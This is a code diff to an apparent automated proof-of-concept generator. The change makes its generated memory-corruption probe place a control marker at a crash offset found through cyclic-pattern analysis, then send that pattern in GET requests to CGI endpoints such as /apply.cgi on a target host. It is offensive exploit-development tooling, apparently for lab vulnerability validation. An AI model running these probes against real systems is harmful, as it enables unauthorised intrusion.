@@ -14,6 +14,7 @@ class PoCContext:
     candidate_summary: str
     evidence_refs: list[str]
     families: list[str]
+    crash_replay: dict[str, object] | None = None
 
 
 @dataclass(frozen=True)
@@ -499,6 +500,34 @@ def _generate_memory_stateful_probe(ctx: PoCContext) -> str:
     service_literal = json.dumps(ctx.target_service)
     candidate_literal = json.dumps(ctx.candidate_id)
     summary_literal = json.dumps(ctx.candidate_summary)
+    crash_hint = ctx.crash_replay if isinstance(ctx.crash_replay, dict) else {}
+    offsets: list[int] = []
+    offsets_any = crash_hint.get("cyclic_offsets")
+    if isinstance(offsets_any, list):
+        for item_any in offsets_any:
+            if not isinstance(item_any, dict):
+                continue
+            off_any = item_any.get("offset")
+            if isinstance(off_any, int) and off_any >= 0:
+                offsets.append(off_any)
+    first_offset = min(offsets) if offsets else -1
+    probe_len = 384
+    if first_offset >= 0:
+        probe_len = max(384, min(2048, first_offset + 128))
+
+    replay_meta: list[str] = []
+    for key, label in (
+        ("status", "crash_replay_status"),
+        ("signal_name", "crash_replay_signal"),
+        ("primitive_hint", "crash_replay_primitive"),
+    ):
+        value = crash_hint.get(key)
+        if isinstance(value, str) and value:
+            replay_meta.append(f"{label}={value}")
+    if offsets:
+        replay_meta.append("crash_replay_offsets=" + ",".join(str(off) for off in offsets[:6]))
+    replay_meta_literal = json.dumps(" ".join(replay_meta))
+    crash_hint_literal = repr(crash_hint)
     return textwrap.dedent(
         f"""\
         from __future__ import annotations
@@ -536,6 +565,10 @@ def _generate_memory_stateful_probe(ctx: PoCContext) -> str:
         class PoC:
             chain_id = {chain_literal}
             target_service = {service_literal}
+            _PROBE_LEN = {probe_len}
+            _CONTROL_OFFSET = {first_offset}
+            _CRASH_REPLAY_HINT = {crash_hint_literal}
+            _CRASH_REPLAY_EVIDENCE = {replay_meta_literal}
 
             def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
                 self.target_ip = target_ip
@@ -545,7 +578,12 @@ def _generate_memory_stateful_probe(ctx: PoCContext) -> str:
             def execute(self) -> PoCResult:
                 timestamp = _utc_now()
                 marker = "SCOUT_PROOF"
-                pattern = _cyclic(384)
+                control_marker = "SCOUTCTRL"
+                if 0 <= int(self._CONTROL_OFFSET) < int(self._PROBE_LEN):
+                    tail_len = max(0, int(self._PROBE_LEN) - int(self._CONTROL_OFFSET) - len(control_marker))
+                    pattern = _cyclic(int(self._CONTROL_OFFSET)) + control_marker + _cyclic(tail_len)
+                else:
+                    pattern = _cyclic(int(self._PROBE_LEN))
                 evidence_prefix = (
                     "autopoc_mode=deterministic_lab_proof "
                     + "candidate_id="
@@ -554,6 +592,8 @@ def _generate_memory_stateful_probe(ctx: PoCContext) -> str:
                     + {summary_literal}
                     + " probe=memory_stateful"
                 )
+                if self._CRASH_REPLAY_EVIDENCE:
+                    evidence_prefix = evidence_prefix + " " + self._CRASH_REPLAY_EVIDENCE
                 probes = [
                     ("GET", "/cgi-bin/test?data=" + urllib.parse.quote(pattern)),
                     ("GET", "/apply.cgi?payload=" + urllib.parse.quote(pattern)),
